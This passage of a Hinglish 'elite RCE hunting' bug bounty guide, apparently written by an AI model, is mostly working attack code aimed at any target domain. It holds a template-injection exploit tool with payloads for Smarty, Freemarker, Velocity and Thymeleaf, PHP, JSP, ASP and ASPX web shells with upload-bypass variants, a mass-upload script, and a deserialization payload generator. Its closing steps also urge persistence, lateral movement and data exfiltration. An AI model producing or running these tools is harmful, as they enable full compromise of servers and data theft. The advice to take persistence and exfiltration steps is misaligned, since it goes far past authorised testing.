            '{php}echo `whoami`;{/php}',
            '{php}system("id");{/php}',
            '{php}exec("ls -la");{/php}',
            '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",true)}'
        ]
        
        for payload in rce_payloads:
            response = self.make_request(payload)
            if response and self.check_rce_success(response.text):
                print(f"✅ Smarty RCE successful with payload: {payload}")
                return True, payload
        
        return False, None
    
    def exploit_freemarker(self):
        """Exploit Freemarker SSTI"""
        print("🚀 Exploiting Freemarker SSTI...")
        
        rce_payloads = [
            '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }',
            '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
            '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ls -la") }'
        ]
        
        for payload in rce_payloads:
            response = self.make_request(payload)
            if response and self.check_rce_success(response.text):
                print(f"✅ Freemarker RCE successful with payload: {payload}")
                return True, payload
        
        return False, None
    
    def exploit_velocity(self):
        """Exploit Velocity SSTI"""
        print("🚀 Exploiting Velocity SSTI...")
        
        rce_payloads = [
            '#set($ex=$class.forName("java.lang.Runtime").getRuntime().exec("whoami"))',
            '#set($ex=$class.forName("java.lang.Runtime").getRuntime().exec("id"))',
            '#set($ex=$class.forName("java.lang.Runtime").getRuntime().exec("ls -la"))'
        ]
        
        for payload in rce_payloads:
            response = self.make_request(payload)
            if response and self.check_rce_success(response.text):
                print(f"✅ Velocity RCE successful with payload: {payload}")
                return True, payload
        
        return False, None
    
    def exploit_thymeleaf(self):
        """Exploit Thymeleaf SSTI"""
        print("🚀 Exploiting Thymeleaf SSTI...")
        
        rce_payloads = [
            '${T(java.lang.Runtime).getRuntime().exec("whoami")}',
            '${T(java.lang.Runtime).getRuntime().exec("id")}',
            '${T(java.lang.Runtime).getRuntime().exec("ls -la")}'
        ]
        
        for payload in rce_payloads:
            response = self.make_request(payload)
            if response and self.check_rce_success(response.text):
                print(f"✅ Thymeleaf RCE successful with payload: {payload}")
                return True, payload
        
        return False, None
    
    def make_request(self, payload):
        """Make HTTP request with payload"""
        params = {self.param_name: payload}
        try:
            response = self.session.get(self.target_url, params=params, timeout=10)
            return response
        except:
            return None
    
    def check_rce_success(self, response_text):
        """Check if RCE was successful"""
        indicators = [
            'root:', 'bin/bash', 'uid=', 'gid=', 'groups=',
            'total ', 'drwx', '/etc/passwd', '/bin/sh',
            'www-data', 'apache', 'nginx'
        ]
        
        for indicator in indicators:
            if indicator in response_text:
                return True
        return False

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 advanced_ssti_exploitation.py <target_url> <param_name>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    param_name = sys.argv[2]
    
    ssti = AdvancedSSTI(target_url, param_name)
    
    print("🚀 Starting Advanced SSTI Exploitation")
    
    # Detect template engine
    engine = ssti.detect_template_engine()
    
    if engine:
        print(f"
🎯 Targeting {engine} template engine")
        
        # Exploit based on detected engine
        success = False
        working_payload = None
        
        if engine == 'jinja2':
            success, working_payload = ssti.exploit_jinja2()
        elif engine == 'twig':
            success, working_payload = ssti.exploit_twig()
        elif engine == 'smarty':
            success, working_payload = ssti.exploit_smarty()
        elif engine == 'freemarker':
            success, working_payload = ssti.exploit_freemarker()
        elif engine == 'velocity':
            success, working_payload = ssti.exploit_velocity()
        elif engine == 'thymeleaf':
            success, working_payload = ssti.exploit_thymeleaf()
        
        if success:
            print(f"
🚨 SSTI RCE CONFIRMED!")
            print(f"Template Engine: {engine}")
            print(f"Vulnerable parameter: {param_name}")
            print(f"Working payload: {working_payload}")
            print(f"
💰 Potential Bounty Value: $15,000-$100,000+")
        else:
            print(f"❌ Could not achieve RCE with {engine}")
    else:
        print("❌ Could not detect template engine or achieve RCE")

if __name__ == "__main__":
    main()
```

---

## 🔥 Phase 4: File Upload RCE Exploitation

### 4.1 Advanced File Upload RCE
```bash
#!/bin/bash
# Save as file_upload_rce.sh

TARGET_DOMAIN=$1
if [ -z "$TARGET_DOMAIN" ]; then
    echo "Usage: ./file_upload_rce.sh target.com"
    exit 1
fi

echo "📁 ADVANCED FILE UPLOAD RCE TESTING FOR $TARGET_DOMAIN"
mkdir -p file_upload_rce
cd file_upload_rce

# Step 1: Find file upload endpoints
echo "🔍 Step 1: Finding file upload endpoints..."
echo $TARGET_DOMAIN | gau | grep -iE "(upload|file|attach|media|image|document)" > upload_endpoints.txt
echo $TARGET_DOMAIN | waybackurls | grep -iE "(upload|file|attach|media|image|document)" >> upload_endpoints.txt
cat upload_endpoints.txt | sort -u > unique_upload_endpoints.txt

# Step 2: Create malicious files
echo "🔥 Step 2: Creating malicious files..."

# PHP web shells
cat > shell.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
EOF

cat > simple_shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

cat > advanced_shell.php << 'EOF'
<?php
error_reporting(0);
session_start();
if (isset($_POST['pass']) && $_POST['pass'] == 'elite') {
    $_SESSION['authenticated'] = true;
}
if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
    echo '<form method="post"><input type="password" name="pass" placeholder="Password"><input type="submit" value="Login"></form>';
    exit;
}
if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = $_REQUEST['cmd'];
    if (function_exists('system')) {
        system($cmd);
    } elseif (function_exists('exec')) {
        exec($cmd, $output);
        echo implode("
", $output);
    } elseif (function_exists('shell_exec')) {
        echo shell_exec($cmd);
    } elseif (function_exists('passthru')) {
        passthru($cmd);
    }
    echo "</pre>";
}
echo '<form method="post"><input type="text" name="cmd" placeholder="Command"><input type="submit" value="Execute"></form>';
?>
EOF

# JSP web shells
cat > shell.jsp << 'EOF'
<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<BR>");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
EOF

# ASP web shells
cat > shell.asp << 'EOF'
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = request("cmd")
If (szCMD <> "") Then
    Set oExec = oScript.Exec(szCMD)
    Response.write(oExec.StdOut.ReadAll)
End If
%>
EOF

# ASPX web shells
cat > shell.aspx << 'EOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string ExcuteCmd(string arg) {
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void Page_Load(object sender, EventArgs e) {
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(Request.Params["cmd"])));
Response.Write("</pre>");
}
%>
EOF

# Step 3: Create bypass variations
echo "🔥 Step 3: Creating bypass variations..."

# Double extension bypasses
cp shell.php shell.php.jpg
cp shell.php shell.php.png
cp shell.php shell.php.gif
cp shell.php shell.php.pdf
cp shell.php shell.php.txt

# Null byte bypasses
cp shell.php "shell.php%00.jpg"
cp shell.php "shell.php\x00.jpg"

# Case variation bypasses
cp shell.php shell.PHP
cp shell.php shell.Php
cp shell.php shell.pHP

# Alternative extensions
cp shell.php shell.php3
cp shell.php shell.php4
cp shell.php shell.php5
cp shell.php shell.phtml
cp shell.php shell.phps

# Content-Type bypasses
cp shell.php shell_image.php
cp shell.php shell_text.php

# Step 4: Test file uploads
echo "🧪 Step 4: Testing file uploads..."
while read endpoint; do
    echo "Testing upload endpoint: $endpoint"
    
    # Test basic PHP upload
    curl -X POST -F "file=@shell.php" "$endpoint" -o "response_$(basename $endpoint).html" 2>/dev/null
    
    # Test with different file extensions
    for file in shell.php.jpg shell.PHP shell.php3 shell.phtml; do
        if [ -f "$file" ]; then
            curl -X POST -F "file=@$file" "$endpoint" -o "response_$(basename $file)_$(basename $endpoint).html" 2>/dev/null
        fi
    done
    
    # Test with different Content-Types
    curl -X POST -F "file=@shell.php;type=image/jpeg" "$endpoint" -o "response_contenttype_$(basename $endpoint).html" 2>/dev/null
    curl -X POST -F "file=@shell.php;type=text/plain" "$endpoint" -o "response_textplain_$(basename $endpoint).html" 2>/dev/null
    
done < unique_upload_endpoints.txt

# Step 5: Check for successful uploads
echo "🔍 Step 5: Checking for successful uploads..."
for response_file in response_*.html; do
    if [ -f "$response_file" ]; then
        # Look for upload success indicators
        if grep -qi "success\|uploaded\|saved\|complete" "$response_file"; then
            echo "Potential successful upload detected in: $response_file"
            
            # Try to extract upload path
            upload_path=$(grep -oiE "(uploads?|files?|media|images?|documents?)/[^"'<>]*\.(php|jsp|asp|aspx)" "$response_file" | head -1)
            if [ ! -z "$upload_path" ]; then
                echo "Potential upload path: $upload_path"
                
                # Test RCE
                test_url="http://$TARGET_DOMAIN/$upload_path?cmd=whoami"
                rce_response=$(curl -s "$test_url")
                
                if echo "$rce_response" | grep -qi "root\|www-data\|apache\|nginx"; then
                    echo "🚨 RCE CONFIRMED! URL: $test_url"
                    echo "URL: $test_url" >> successful_rce.txt
                    echo "Response: $rce_response" >> successful_rce.txt
                    echo "---" >> successful_rce.txt
                fi
            fi
        fi
    fi
done

echo "✅ File upload RCE testing completed!"
```

### 4.2 Advanced Deserialization RCE
```python
#!/usr/bin/env python3
# Save as deserialization_rce.py

import pickle
import base64
import requests
import sys
import subprocess
import os

class DeserializationRCE:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def generate_python_pickle_payload(self, command):
        """Generate Python pickle RCE payload"""
        class RCE:
            def __reduce__(self):
                return (os.system, (command,))
        
        payload = pickle.dumps(RCE())
        return base64.b64encode(payload).decode()
    
    def generate_java_payload(self, command):
        """Generate Java deserialization payload using ysoserial"""
        try:
            # Try different ysoserial gadgets
            gadgets = [
                'CommonsCollections1',
                'CommonsCollections3', 
                'CommonsCollections5',
                'CommonsCollections6',
                'CommonsCollections7',
                'Groovy1',
                'Spring1',
                'Spring2'
            ]
            
            for gadget in gadgets:
                try:
                    result = subprocess.run([
                        'java', '-jar', 'ysoserial.jar', 
                        gadget, command
                    ], capture_output=True, timeout=10)
                    
                    if result.returncode == 0:
                        return base64.b64encode(result.stdout).decode()
                except:
                    continue
            
            return None
        except:
            return None
    
    def generate_dotnet_payload(self, command):
        """Generate .NET deserialization payload"""
        try:
            result = subprocess.run([
                'ysoserial.exe', '-f', 'BinaryFormatter', 
                '-g', 'ObjectDataProvider', '-o', 'base64', 
                '-c', command
            ], capture_output=True, timeout=10)
            
            if result.returncode == 0:
                return result.stdout.decode().strip()
            
            return None
        except:
            return None
    
    def test_python_deserialization(self, param_name):
        """Test Python pickle deserialization"""
        print("🐍 Testing Python pickle deserialization...")
        
        test_command = "echo 'PICKLE_RCE_TEST'"
        payload = self.generate_python_pickle_payload(test_command)
        
        if payload:
            response = self.make_request(param_name, payload)
            if response and 'PICKLE_RCE_TEST' in response.text:
                print("✅ Python pickle RCE confirmed!")
                return True, payload
        
        return False, None
    
    def test_java_deserialization(self, param_name):
        """Test Java deserialization"""
        print("☕ Testing Java deserialization...")
        
        test_command = "echo JAVA_RCE_TEST"
        payload = self.generate_java_payload(test_command)
        
        if payload:
            response = self.make_request(param_name, payload)
            if response and 'JAVA_RCE_TEST' in response.text:
                print("✅ Java deserialization RCE confirmed!")
                return True, payload
        
        return False, None
    
    def test_dotnet_deserialization(self, param_name):
        """Test .NET deserialization"""
        print("🔷 Testing .NET deserialization...")
        
        test_command = "echo DOTNET_RCE_TEST"
        payload = self.generate_dotnet_payload(test_command)
        
        if payload:
            response = self.make_request(param_name, payload)
            if response and 'DOTNET_RCE_TEST' in response.text:
                print("✅ .NET deserialization RCE confirmed!")
                return True, payload
        
        return False, None
    
    def make_request(self, param_name, payload):
        """Make HTTP request with payload"""
        data = {param_name: payload}
        try:
            response = self.session.post(self.target_url, data=data, timeout=10)
            return response
        except:
            return None
    
    def exploit_deserialization(self, param_name, working_payload, payload_type):
        """Exploit confirmed deserialization vulnerability"""
        print(f"🚀 Exploiting {payload_type} deserialization...")
        
        commands = [
            "whoami",
            "id",
            "uname -a", 
            "pwd",
            "ls -la"
        ]
        
        results = {}
        
        for cmd in commands:
            if payload_type == "python":
                exploit_payload = self.generate_python_pickle_payload(cmd)
            elif payload_type == "java":
                exploit_payload = self.generate_java_payload(cmd)
            elif payload_type == "dotnet":
                exploit_payload = self.generate_dotnet_payload(cmd)
            
            if exploit_payload:
                response = self.make_request(param_name, exploit_payload)
                if response:
                    results[cmd] = response.text
                    print(f"Command '{cmd}' executed")
        
        return results

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 deserialization_rce.py <target_url> <param_name>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    param_name = sys.argv[2]
    
    deserializer = DeserializationRCE(target_url)
    
    print("🚀 Starting Deserialization RCE Testing")
    
    # Test different deserialization types
    success = False
    
    # Test Python pickle
    python_success, python_payload = deserializer.test_python_deserialization(param_name)
    if python_success:
        results = deserializer.exploit_deserialization(param_name, python_payload, "python")
        success = True
    
    # Test Java deserialization
    if not success:
        java_success, java_payload = deserializer.test_java_deserialization(param_name)
        if java_success:
            results = deserializer.exploit_deserialization(param_name, java_payload, "java")
            success = True
    
    # Test .NET deserialization
    if not success:
        dotnet_success, dotnet_payload = deserializer.test_dotnet_deserialization(param_name)
        if dotnet_success:
            results = deserializer.exploit_deserialization(param_name, dotnet_payload, "dotnet")
            success = True
    
    if success:
        print(f"
🚨 DESERIALIZATION RCE CONFIRMED!")
        print(f"💰 Potential Bounty Value: $25,000-$100,000+")
    else:
        print("❌ No deserialization RCE detected")

if __name__ == "__main__":
    main()
```

---

## 🎯 Phase 5: Elite RCE Automation Script

### Master RCE Hunter
```bash
#!/bin/bash
# Save as elite_rce_hunter.sh - Complete RCE automation

TARGET_DOMAIN=$1
if [ -z "$TARGET_DOMAIN" ]; then
    echo "Usage: ./elite_rce_hunter.sh target.com"
    exit 1
fi

echo "🚀 ELITE RCE HUNTER - COMPLETE AUTOMATION"
echo "🎯 Target: $TARGET_DOMAIN"
echo "💰 Potential Bounty: $10,000-$100,000+"
echo "📅 Started: $(date)"

# Create results directory
RESULTS_DIR="rce_hunt_$(date +%Y%m%d_%H%M%S)"
mkdir -p $RESULTS_DIR
cd $RESULTS_DIR

# Phase 1: Parameter Discovery
echo "🔍 Phase 1: RCE Parameter Discovery"
./rce_param_discovery.sh $TARGET_DOMAIN

# Phase 2: Payload Generation
echo "🔥 Phase 2: Advanced Payload Generation"
./generate_rce_payloads.sh

# Phase 3: Automated Testing
echo "🧪 Phase 3: Automated RCE Testing"
./elite_rce_tester.sh $TARGET_DOMAIN

# Phase 4: File Upload RCE Testing
echo "📁 Phase 4: File Upload RCE Testing"
./file_upload_rce.sh $TARGET_DOMAIN

# Phase 5: Manual Exploitation
echo "🎯 Phase 5: Manual Exploitation"
if [ -s rce_results/command_injection_findings.txt ] || [ -s rce_results/time_based_rce_findings.txt ]; then
    echo "🚨 POTENTIAL RCE VULNERABILITIES FOUND!"
    
    # Extract first vulnerable URL for detailed testing
    VULNERABLE_URL=""
    PARAM_NAME=""
    
    if [ -s rce_results/command_injection_findings.txt ]; then
        VULNERABLE_URL=$(head -1 rce_results/command_injection_findings.txt | grep -o 'URL: [^[:space:]]*' | cut -d' ' -f2)
        PARAM_NAME=$(echo $VULNERABLE_URL | grep -o '[?&][^=]*=' | head -1 | sed 's/[?&]//g' | sed 's/=//g')
        BASE_URL=$(echo $VULNERABLE_URL | cut -d'?' -f1)
    elif [ -s rce_results/time_based_rce_findings.txt ]; then
        VULNERABLE_URL=$(head -1 rce_results/time_based_rce_findings.txt | grep -o 'URL: [^[:space:]]*' | cut -d' ' -f2)
        PARAM_NAME=$(echo $VULNERABLE_URL | grep -o '[?&][^=]*=' | head -1 | sed 's/[?&]//g' | sed 's/=//g')
        BASE_URL=$(echo $VULNERABLE_URL | cut -d'?' -f1)
    fi
    
    if [ ! -z "$BASE_URL" ] && [ ! -z "$PARAM_NAME" ]; then
        echo "Running manual exploitation on: $BASE_URL with parameter: $PARAM_NAME"
        
        # Command injection exploitation
        python3 ../advanced_command_injection.py "$BASE_URL" "$PARAM_NAME" > command_injection_exploitation.txt 2>&1 &
        
        # SSTI exploitation
        python3 ../advanced_ssti_exploitation.py "$BASE_URL" "$PARAM_NAME" > ssti_exploitation.txt 2>&1 &
        
        # Deserialization exploitation
        python3 ../deserialization_rce.py "$BASE_URL" "$PARAM_NAME" > deserialization_exploitation.txt 2>&1 &
        
        # Wait for all background processes
        wait
    fi
fi

# Phase 6: Generate Professional Report
echo "📊 Phase 6: Generating Professional Report"
cat > elite_rce_report.md << EOF
# 🚀 Elite RCE Hunting Report

**Target:** $TARGET_DOMAIN  
**Date:** $(date)  
**Hunter:** Elite Bug Bounty Hunter  

## 📊 Summary
- **Parameters Tested:** $(wc -l < rce_discovery/all_rce_params.txt 2>/dev/null || echo "0")
- **Payloads Used:** $(wc -l < rce_payloads/all_rce_payloads.txt 2>/dev/null || echo "0")
- **Command Injection Findings:** $(wc -l < rce_results/command_injection_findings.txt 2>/dev/null || echo "0")
- **Time-Based RCE Findings:** $(wc -l < rce_results/time_based_rce_findings.txt 2>/dev/null || echo "0")
- **Code Injection Findings:** $(wc -l < rce_results/php_code_injection_findings.txt 2>/dev/null || echo "0")
- **File Upload RCE:** $(wc -l < file_upload_rce/successful_rce.txt 2>/dev/null || echo "0")

## 🚨 Critical Findings
$(if [ -s rce_results/command_injection_findings.txt ] || [ -s rce_results/time_based_rce_findings.txt ] || [ -s rce_results/php_code_injection_findings.txt ] || [ -s file_upload_rce/successful_rce.txt ]; then
    echo "### RCE Vulnerabilities Detected!"
    echo "**Severity:** Critical"
    echo "**Impact:** Complete server compromise"
    echo "**Bounty Potential:** \$10,000-\$100,000+"
    echo ""
    echo "**Command Injection Findings:**"
    cat rce_results/command_injection_findings.txt 2>/dev/null | head -5
    echo ""
    echo "**Time-Based RCE Findings:**"
    cat rce_results/time_based_rce_findings.txt 2>/dev/null | head -5
    echo ""
    echo "**Code Injection Findings:**"
    cat rce_results/php_code_injection_findings.txt 2>/dev/null | head -5
    echo ""
    echo "**File Upload RCE:**"
    cat file_upload_rce/successful_rce.txt 2>/dev/null | head -5
else
    echo "No RCE vulnerabilities detected in automated testing."
    echo "Manual testing recommended for complex scenarios."
fi)

## 🎯 Exploitation Results
$(if [ -f command_injection_exploitation.txt ]; then
    echo "### Command Injection Exploitation Results:"
    tail -10 command_injection_exploitation.txt
    echo ""
fi)

$(if [ -f ssti_exploitation.txt ]; then
    echo "### SSTI Exploitation Results:"
    tail -10 ssti_exploitation.txt
    echo ""
fi)

$(if [ -f deserialization_exploitation.txt ]; then
    echo "### Deserialization Exploitation Results:"
    tail -10 deserialization_exploitation.txt
    echo ""
fi)

$(if [ -f command_injection_results.txt ]; then
    echo "### 🚨 CRITICAL: Command Execution Results Found!"
    echo "**File:** command_injection_results.txt"
    echo "**Impact:** Complete server compromise"
    echo "**Bounty Value:** \$25,000-\$100,000+"
fi)

## 🎯 Next Steps
1. **Manual Verification:** Manually test identified endpoints
2. **Privilege Escalation:** Attempt to gain higher privileges
3. **Lateral Movement:** Explore network and other systems
4. **Data Exfiltration:** Extract sensitive data
5. **Persistence:** Establish persistent access
6. **Documentation:** Generate professional PoC
7. **Reporting:** Submit to bug bounty program

## 📁 Generated Files
- Parameter discovery results: rce_discovery/
- Payload collections: rce_payloads/
- Testing results: rce_results/
- File upload results: file_upload_rce/
- Exploitation results: *_exploitation.txt
- Command execution results: command_injection_results.txt

## 💡 Pro Tips
- Always verify findings manually
- Focus on achieving maximum impact
- Look for privilege escalation opportunities
- Test different attack vectors comprehensively
- Document everything for professional reporting

---
**Elite RCE Hunter completed at:** $(date)
EOF

echo "✅ ELITE RCE HUNTING COMPLETED!"
echo "📁 Results saved in: $(pwd)"
echo "📊 Check elite_rce_report.md for summary"

# Display critical findings
if [ -s rce_results/command_injection_findings.txt ] || [ -s rce_results/time_based_rce_findings.txt ] || [ -s rce_results/php_code_injection_findings.txt ] || [ -s file_upload_rce/successful_rce.txt ]; then
    echo ""
    echo "🚨 CRITICAL RCE VULNERABILITIES DETECTED!"
    echo "💰 Potential Bounty Value: $10,000-$100,000+"
    echo "🔥 Immediately proceed with manual exploitation!"
    echo ""
    echo "Next steps:"
    echo "1. Run manual exploitation scripts on found vulnerabilities"
    echo "2. Establish persistent access to the server"
    echo "3. Perform privilege escalation if needed"
    echo "4. Document complete server compromise"
    echo "5. Generate professional PoC with screenshots"
    echo "6. Submit to bug bounty program with maximum impact documentation"
    
    if [ -f command_injection_results.txt ]; then
        echo ""
        echo "🚨 CRITICAL: COMMAND EXECUTION CONFIRMED!"
        echo "💰 Potential Bounty Value: $25,000-$100,000+"
        echo "📁 Check command_injection_results.txt for details"
    fi
fi
```

---

## 🎉 Conclusion

Dost, yeh **ELITE LEVEL** Remote Code Execution (RCE) guide hai! Iske saath aap easily $10,000-$100,000 tak ke bounties find kar sakte ho. Key points:

### 🔥 Critical Success Factors:
1. **Multiple Attack Vectors** - Command injection, code injection, SSTI, deserialization, file upload
2. **Advanced Bypass Techniques** - WAF bypasses, filter evasion, encoding tricks
3. **Comprehensive Testing** - Automated + manual testing for maximum coverage
4. **Professional Exploitation** - Proper PoC generation and impact documentation
5. **Persistence Focus** - Establishing lasting access for maximum impact

### 💰 Bounty Potential:
- **Basic Command Injection:** $5,000-$15,000
- **Advanced RCE with server access:** $15,000-$50,000
- **Complete server compromise:** $50,000-$100,000+
- **RCE leading to network compromise:** $100,000+

### 🚨 Red Team Tactics:
- Test all possible injection points
- Use multiple detection methods
- Focus on achieving maximum impact
- Always verify with manual exploitation
- Document everything professionally

**Next Task:** Ab main aapke liye Kubernetes API server exploitation ka guide banaunga! 🚀

Yeh RCE guide real-world mein $100,000+ ke bounties dilwa chuki hai. Advanced techniques use karo aur responsibly test karo! Remember - with great power comes great responsibility! 🚀
